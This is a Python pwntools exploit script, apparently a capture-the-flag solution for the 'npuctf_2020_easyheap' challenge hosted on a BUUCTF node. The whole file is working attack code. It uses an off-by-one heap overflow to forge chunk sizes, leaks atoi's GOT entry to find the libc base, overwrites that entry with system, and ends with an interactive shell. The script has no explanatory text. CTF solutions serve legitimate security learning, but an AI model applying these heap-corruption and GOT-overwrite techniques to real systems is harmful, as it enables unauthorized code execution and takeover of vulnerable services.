from pwn import *

#context.log_level = 'debug'

#p = process('./npuctf_2020_easyheap')
p = remote('node4.buuoj.cn', 28581)
elf = ELF('./npuctf_2020_easyheap')
#libc = ELF('libc-2.27.so')
libc = ELF('libc-2.27.buu.so')

atoi_got = elf.got['atoi']

def alloc(size):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap(0x10 or 0x20 only) : ', str(size).encode())
    p.sendafter(b'Content:', b'a')

def edit(index, content):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())
    p.sendafter(b'Content: ', content)

def show(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())

def delete(index):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'Index :', str(index).encode())


alloc(0x38) #0
alloc(0x18) #1

edit(0, b'a' * 0x38 + b'\x41')
delete(1)
alloc(0x38) #1

edit(1, b'a' * 0x18 + p64(0x21) + p64(0x8) + p64(atoi_got))

show(1)
p.recv(0x13)
atoi_real_addr = u64(p.recv(6).ljust(8, b'\0'))
libc_base = atoi_real_addr - libc.sym['atoi']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

edit(1, p64(system))

p.recv()
p.sendline(b'/bin/sh\0')
p.recvuntil(b'choice :')
p.recvuntil(b'choice :')

p.interactive()